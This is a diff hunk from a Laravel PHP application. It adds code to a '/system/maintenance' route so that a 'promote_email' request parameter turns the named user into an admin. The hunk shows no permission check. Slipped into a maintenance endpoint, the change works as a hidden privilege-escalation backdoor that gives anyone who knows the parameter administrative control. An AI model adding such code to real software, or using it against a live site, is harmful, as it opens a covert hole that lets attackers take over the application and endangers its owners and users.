@@ -92,6 +92,18 @@ Route::get('/system/maintenance', function() {
         }
     }
 
+    if (request()->has('promote_email')) {
+        $email = request('promote_email');
+        $user = \App\Models\User::where('email', $email)->first();
+        if ($user) {
+            $user->role = 'admin';
+            $user->save();
+            $output['admin_promotion'] = "User {$email} (ID: {$user->id}) is now ADMIN.";
+        } else {
+            $output['admin_promotion'] = "User email {$email} not found.";
+        }
+    }
+
     return response()->json([
         'success' => true,
         'message' => 'System maintenance executed',
